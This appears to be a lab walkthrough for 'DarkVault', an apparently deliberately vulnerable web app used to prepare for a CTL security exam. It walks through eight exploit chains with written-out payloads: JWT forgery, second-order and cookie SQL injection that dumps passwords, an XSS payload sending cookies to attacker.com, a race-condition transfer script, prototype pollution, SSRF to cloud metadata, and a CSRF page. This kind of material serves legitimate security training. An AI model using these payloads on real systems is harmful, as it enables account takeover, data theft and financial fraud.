# Advanced Vulnerability Chains in DarkVault

This document outlines sophisticated vulnerability chains in DarkVault that align with the Cyber Scheme CTL exam requirements. These vulnerabilities focus on advanced exploitation techniques and privilege escalation.

## 1. JWT Token Manipulation and Privilege Escalation Chain

**Objective**: Gain admin access through JWT token manipulation

### Information Gathering
1. Begin by examining the JWT token used for authentication
2. Request the token structure from the information disclosure endpoint:
   ```
   GET /api/get-jwt-info
   ```
3. Analyze the JWT token to understand its structure, including header and payload
4. Look for JWT signature algorithms and validate flags

### JWT Vulnerability Exploitation
1. The token can be decoded and manipulated with tools like jwt.io
2. Discover the hardcoded JWT secret from source code leakage or error messages
3. Edit the payload to change your role to "admin"
4. Sign the token with the discovered secret:
   ```
   darkvault-super-secret-key
   ```
5. Alternatively, try the weaker development key:
   ```
   dev-key
   ```
6. If unable to get the secret, attempt an algorithm confusion attack by changing the algorithm to "none"

### Privilege Escalation Verification
1. Make a request to admin endpoints with your forged token
2. Verify access with:
   ```
   GET /api/admin/profile-updates
   ```
3. The application fails to verify that the token claims match the database values, allowing you to effectively change your role

## 2. Blind Second-Order SQL Injection Chain

**Objective**: Escalate privileges through blind second-order SQL injection

### Detection Phase
1. Login as a regular user
2. Update your profile information with carefully crafted payloads to test for SQL injection
3. Insert a test payload in the location field:
   ```
   London'; SELECT 1; --
   ```
4. No immediate errors will be shown (blind vulnerability)

### Exploitation Phase
1. Insert an update query in the location field:
   ```
   London'; UPDATE users SET role = 'admin' WHERE id = [your_id]; --
   ```
2. The injection won't execute immediately but will be stored in the database
3. When an admin views profile updates through the admin dashboard, your query executes with admin privileges
4. Wait for background processes or admin actions to trigger the second query
5. Verify if your role has been updated to admin
6. Alternatively, you can extract information:
   ```
   London'; SELECT group_concat(username,':',password) FROM users; --
   ```

## 3. Cookie-Based SQL Injection Chain

**Objective**: Extract sensitive information using SQL injection in cookie values

### Discovery
1. Examine the application for endpoints that might use cookie values
2. The user preferences endpoint uses the theme cookie value
3. Set a test cookie to check for SQL injection:
   ```
   theme=dark'--
   ```
4. Make a request to:
   ```
   GET /api/user-preferences
   ```

### Exploitation
1. Determine the number of columns by testing ORDER BY:
   ```
   theme=dark' ORDER BY 1--
   theme=dark' ORDER BY 2--
   theme=dark' ORDER BY 3--
   ```
2. Once you know the column count, use UNION queries to extract data:
   ```
   theme=dark' UNION SELECT 1,2,3--
   ```
3. Extract sensitive data:
   ```
   theme=dark' UNION SELECT username,password,email FROM users--
   ```
4. Since it's a blind vulnerability, extract information one piece at a time:
   ```
   theme=dark' UNION SELECT username,NULL,NULL FROM users WHERE id=1--
   theme=dark' UNION SELECT password,NULL,NULL FROM users WHERE id=1--
   ```

## 4. DOM-Based XSS and Cookie Theft Chain

**Objective**: Execute JavaScript in user browsers to steal session tokens

### DOM-Based XSS Discovery
1. Examine client-side JavaScript for unsafe DOM manipulation
2. The API documentation page manipulates DOM based on the URL hash fragment
3. Test for basic XSS with:
   ```
   /api/documentation#<script>alert(1)</script>
   ```
4. When the page loads, JavaScript inserts the hash value into the innerHTML property without sanitization

### Exploitation
1. Craft a malicious hash value that executes JavaScript:
   ```
   /api/documentation#<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
   ```
2. Send this URL to administrators or wait for them to visit the documentation
3. When they load the page, the JavaScript executes in their browser context
4. Their cookies, including authentication tokens, are sent to your server
5. Use the stolen cookies to impersonate the victim

## 5. Race Condition Exploitation in Banking Transactions

**Objective**: Exploit timing issues to perform multiple transactions with the same funds

### Discovery
1. Identify the quick transfer endpoint:
   ```
   POST /api/quick-transfer
   ```
2. Notice that there's a delay between checking the balance and updating it
3. This creates a race condition where multiple transfers can be initiated before the balance is updated

### Exploitation
1. Create a script that sends multiple transfer requests simultaneously:
   ```javascript
   async function exploitRaceCondition(token, amount, recipient, numRequests = 5) {
     const requests = [];
     for (let i = 0; i < numRequests; i++) {
       requests.push(fetch('/api/quick-transfer', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
           'Authorization': token
         },
         body: JSON.stringify({
           to: recipient,
           amount: amount
         })
       }));
     }
     
     return Promise.all(requests);
   }
   ```
2. Execute the script with a small amount of money that you have in your account
3. The race condition allows multiple transfers to be processed before your balance is updated
4. Result: You can send more money than you actually have

## 6. Prototype Pollution for Authentication Bypass

**Objective**: Alter JavaScript object behavior to bypass authorization checks

### Discovery
1. The application has an endpoint that merges user settings:
   ```
   POST /api/merge-settings
   ```
2. This endpoint uses an unsafe recursive merge function
3. Test for prototype pollution by sending:
   ```json
   {
     "__proto__": {
       "isAdmin": true
     }
   }
   ```

### Exploitation
1. The pollution modifies the behavior of all JavaScript objects in the application
2. The authentication check endpoint uses an empty object in its comparison:
   ```
   GET /api/check-admin
   ```
3. The polluted prototype causes the empty object to have `isAdmin: true`
4. This bypasses authorization checks that rely on object properties
5. Access admin functionality without actually being an admin

## 7. Server-Side Request Forgery (SSRF)

**Objective**: Access internal services and endpoints that are not publicly accessible

### Discovery
1. Identify the proxy endpoint that makes server-side requests:
   ```
   GET /api/proxy?url=https://api.github.com/users
   ```
2. Test if it allows requests to internal services:
   ```
   GET /api/proxy?url=http://localhost:3000/api/admin/users
   ```

### Exploitation
1. Use SSRF to access internal admin endpoints:
   ```
   GET /api/proxy?url=http://localhost:3000/api/admin/profile-updates
   ```
2. Access internal network services:
   ```
   GET /api/proxy?url=http://127.0.0.1:3000/api/admin/run-report
   ```
3. Enumerate internal network:
   ```
   GET /api/proxy?url=http://192.168.1.1/
   ```
4. Access cloud metadata services:
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   ```

## 8. CSRF Attack Chain

**Objective**: Perform actions on behalf of other users without their knowledge

### Discovery
1. Identify endpoints that don't implement CSRF protection
2. The email update endpoint is vulnerable:
   ```
   POST /api/update-email
   ```
3. No CSRF token is required when submitting the form

### Exploitation
1. Create an HTML page with an auto-submitting form:
   ```html
   <html>
   <body onload="document.forms[0].submit()">
     <form action="http://localhost:3000/api/update-email" method="POST">
       <input type="hidden" name="email" value="attacker@evil.com">
     </form>
   </body>
   </html>
   ```
2. Host this page on a server or send it directly to a victim
3. When they visit while logged in to DarkVault, their email will be changed without their knowledge
4. You can then perform a password reset using the new email address to take over their account

## Advanced Enumeration Techniques

The CTL exam requires sophisticated enumeration techniques. Here are approaches for DarkVault:

### API Endpoint Discovery
1. Map all endpoints using a combination of client-side code analysis, network traffic monitoring, and fuzzing
2. Look for hidden or undocumented endpoints in JavaScript files
3. Use the `/api/documentation` endpoint to discover API structure

### Authentication Mechanism Analysis
1. Examine the JWT token structure and signing methods
2. Test for weak secrets and algorithm confusion
3. Look for secondary authentication methods and backdoor access points

### Database Schema Enumeration
1. Use SQL injection to extract database schema:
   ```
   " UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table'--
   ```
2. Map relationships between tables to understand data flow
3. Identify potentially sensitive tables for targeted extraction

### Role and Permission Mapping
1. Map different user roles and their permissions
2. Identify endpoints with insufficient access control
3. Test horizontal and vertical privilege escalation paths

## Conclusion

These advanced vulnerability chains align with the Cyber Scheme CTL exam requirements, providing practical experience with:
- Advanced injection vulnerabilities (SQL injection, XSS)
- Authentication and authorization bypass techniques
- Modern web vulnerabilities (prototype pollution, SSRF)
- Race conditions and other timing-based attacks
- Multi-step exploitation chains

Studying and exploiting these vulnerabilities will prepare you for the challenges found in the CTL exam. 